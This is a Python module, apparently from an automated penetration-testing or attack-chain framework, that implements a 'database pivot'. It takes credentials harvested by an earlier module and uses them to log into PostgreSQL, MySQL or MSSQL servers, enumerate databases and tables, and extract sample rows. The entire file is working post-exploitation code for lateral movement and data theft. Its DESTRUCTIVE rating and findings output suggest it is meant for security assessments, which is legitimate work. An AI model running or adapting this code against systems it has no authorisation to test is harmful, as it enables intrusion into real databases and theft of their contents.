from typing import Optional
import requests
import json

from ..context import ExecutionContext
from ..registry import BaseExecutionModule, ExecutionResult, RiskLevel


TIMEOUT = 10

# Veritabanı bağlantıları için opsiyonel bağımlılıklar
try:
    import psycopg2
    PSYCOPG2_AVAILABLE = True
except ImportError:
    PSYCOPG2_AVAILABLE = False

try:
    import pymysql
    PYMYSQL_AVAILABLE = True
except ImportError:
    PYMYSQL_AVAILABLE = False

try:
    import pyodbc
    PYODBC_AVAILABLE = True
except ImportError:
    PYODBC_AVAILABLE = False


class DatabasePivotModule(BaseExecutionModule):
    def __init__(self):
        super().__init__(
            module_id="database_pivot.exploit",
            title="Database Pivot - Connect and Extract Data",
            risk_level=RiskLevel.DESTRUCTIVE,
            domain="database",
            description=(
                "Uses harvested database credentials to connect to the target "
                "database and extract schema information, tables, and data."
            ),
            default_enabled=False,
        )

    def can_run(self, context: ExecutionContext) -> bool:
        return bool(getattr(context, "vault_addr", None))

    def execute(self, context: ExecutionContext, params: Optional[dict] = None) -> ExecutionResult:
        params = params or {}
        db_type = params.get("db_type", "postgres").lower()
        db_host = params.get("db_host")
        db_port = params.get("db_port")
        db_name = params.get("db_name", "postgres")
        username = params.get("username")
        password = params.get("password")
        timeout = params.get("timeout", TIMEOUT)

        # Fall back to credentials harvested earlier in the chain (e.g. by
        # database_credential_harvest.dynamic_creds) when none were supplied
        # explicitly — this is what makes harvest → pivot work end to end.
        if not (username and password):
            harvested = _get_db_creds(context)
            if harvested:
                cred = harvested[0]
                username = username or cred.get("username")
                password = password or cred.get("password")
                db_host = db_host or cred.get("host")
                db_port = db_port or cred.get("port")

        if not (username and password):
            return ExecutionResult(
                status="skipped",
                message=(
                    "No database credentials supplied and none found in context. "
                    "Run database_credential_harvest.dynamic_creds first or pass "
                    "username/password params."
                ),
                evidence={"missing": ["credentials"]},
            )

        db_host = db_host or "localhost"
        db_port = db_port or _default_port(db_type)

        # Bağımlılık kontrolü
        if db_type == "postgres" and not PSYCOPG2_AVAILABLE:
            return ExecutionResult(
                status="error",
                message="psycopg2 not installed. Run: pip install psycopg2-binary",
                evidence={"error": "Missing dependency: psycopg2"},
            )
        elif db_type == "mysql" and not PYMYSQL_AVAILABLE:
            return ExecutionResult(
                status="error",
                message="pymysql not installed. Run: pip install pymysql",
                evidence={"error": "Missing dependency: pymysql"},
            )
        elif db_type == "mssql" and not PYODBC_AVAILABLE:
            return ExecutionResult(
                status="error",
                message="pyodbc not installed. Run: pip install pyodbc",
                evidence={"error": "Missing dependency: pyodbc"},
            )

        print(f"[*] [ACTIVE] Connecting to {db_type} database at {db_host}:{db_port}")

        connection = None
        try:
            connection = _connect_database(db_type, db_host, db_port, db_name, username, password, timeout)

            if not connection:
                return ExecutionResult(
                    status="failed",
                    message=f"Cannot connect to {db_type} database.",
                    evidence={"host": db_host, "port": db_port, "database": db_name},
                )

            # Veritabanı listesini al
            databases = _list_databases(db_type, connection)

            # Tabloları listele (ilk veritabanı)
            target_db = params.get("target_db") or (databases[0] if databases else db_name)
            tables = []
            if target_db:
                tables = _list_tables(db_type, connection, target_db)

            # Veri çek (ilk 3 tablo)
            sample_data = {}
            for table in tables[:3]:
                data = _read_table_data(db_type, connection, target_db, table, 3)
                if data:
                    sample_data[table] = data

            context.add_finding(
                title="HIGH: Database Pivot Successful",
                description=f"Connected to {db_type} database. Found {len(databases)} databases.",
                severity="HIGH",
                evidence={
                    "host": db_host,
                    "port": db_port,
                    "database": target_db,
                    "databases": databases[:10],
                    "tables": tables[:20],
                    "sample_data": sample_data,
                },
            )

            return ExecutionResult(
                status="success",
                message=f"Database pivot succeeded. Found {len(databases)} databases.",
                evidence={
                    "host": db_host,
                    "port": db_port,
                    "databases": databases[:10],
                    "tables": tables[:20],
                    "sample_data": sample_data,
                },
            )

        except Exception as e:
            return ExecutionResult(
                status="error",
                message=f"Database pivot failed: {str(e)}",
                evidence={"error": str(e)},
            )
        finally:
            if connection:
                try:
                    connection.close()
                except Exception:
                    pass


def _default_port(db_type: str) -> int:
    ports = {"postgres": 5432, "mysql": 3306, "mssql": 1433}
    return ports.get(db_type, 5432)


def _get_db_creds(context):
    """Collect database credentials stored on the execution context.

    Looks at ``context.db_credentials`` (direct attribute) and at finding
    evidence produced by the credential harvest module
    (``evidence["credentials"]`` entries with username/password).
    """
    creds = []

    direct = getattr(context, "db_credentials", None)
    if direct:
        creds.extend(direct)

    for finding in getattr(context, "findings", []):
        evidence = finding.get("evidence", {}) or {}
        for cred in evidence.get("credentials", []) or []:
            if isinstance(cred, dict) and "username" in cred and "password" in cred:
                creds.append(cred)

    return creds


def _connect_database(db_type, host, port, database, username, password, timeout):
    try:
        if db_type == "postgres":
            conn = psycopg2.connect(
                host=host, port=port, database=database,
                user=username, password=password, connect_timeout=timeout
            )
            return conn
        elif db_type == "mysql":
            conn = pymysql.connect(
                host=host, port=port, database=database,
                user=username, password=password, connect_timeout=timeout
            )
            return conn
        elif db_type == "mssql":
            conn_str = (
                f"DRIVER={{ODBC Driver 17 for SQL Server}};"
                f"SERVER={host},{port};DATABASE={database};"
                f"UID={username};PWD={password};TrustServerCertificate=yes;"
                f"Connection Timeout={timeout}"
            )
            conn = pyodbc.connect(conn_str)
            return conn
        return None
    except Exception as e:
        print(f"[!] Connection failed: {e}")
        return None


def _list_databases(db_type, connection):
    cursor = None
    try:
        cursor = connection.cursor()
        if db_type == "postgres":
            cursor.execute("SELECT datname FROM pg_database WHERE datistemplate = false;")
            return [row[0] for row in cursor.fetchall()]
        elif db_type == "mysql":
            cursor.execute("SHOW DATABASES;")
            return [row[0] for row in cursor.fetchall()]
        elif db_type == "mssql":
            cursor.execute("SELECT name FROM sys.databases;")
            return [row[0] for row in cursor.fetchall()]
        return []
    except Exception as e:
        print(f"[!] Failed to list databases: {e}")
        return []
    finally:
        if cursor:
            try:
                cursor.close()
            except Exception:
                pass


def _list_tables(db_type, connection, database):
    cursor = None
    try:
        cursor = connection.cursor()
        if db_type == "postgres":
            cursor.execute("SELECT table_name FROM information_schema.tables WHERE table_schema = 'public';")
            return [row[0] for row in cursor.fetchall()]
        elif db_type == "mysql":
            cursor.execute(f"SHOW TABLES FROM `{database}`;")
            return [row[0] for row in cursor.fetchall()]
        elif db_type == "mssql":
            cursor.execute(f"SELECT TABLE_NAME FROM {database}.INFORMATION_SCHEMA.TABLES;")
            return [row[0] for row in cursor.fetchall()]
        return []
    except Exception as e:
        print(f"[!] Failed to list tables: {e}")
        return []
    finally:
        if cursor:
            try:
                cursor.close()
            except Exception:
                pass


def _read_table_data(db_type, connection, database, table, max_rows=3):
    cursor = None
    try:
        cursor = connection.cursor()
        if db_type == "postgres":
            cursor.execute(f"SELECT * FROM {table} LIMIT {max_rows};")
        elif db_type == "mysql":
            cursor.execute(f"SELECT * FROM `{database}`.`{table}` LIMIT {max_rows};")
        elif db_type == "mssql":
            cursor.execute(f"SELECT TOP {max_rows} * FROM {database}.dbo.{table};")

        columns = [desc[0] for desc in cursor.description] if cursor.description else []
        rows = cursor.fetchall()
        return [dict(zip(columns, row)) for row in rows]
    except Exception as e:
        print(f"[!] Failed to read table {table}: {e}")
        return []
    finally:
        if cursor:
            try:
                cursor.close()
            except Exception:
                pass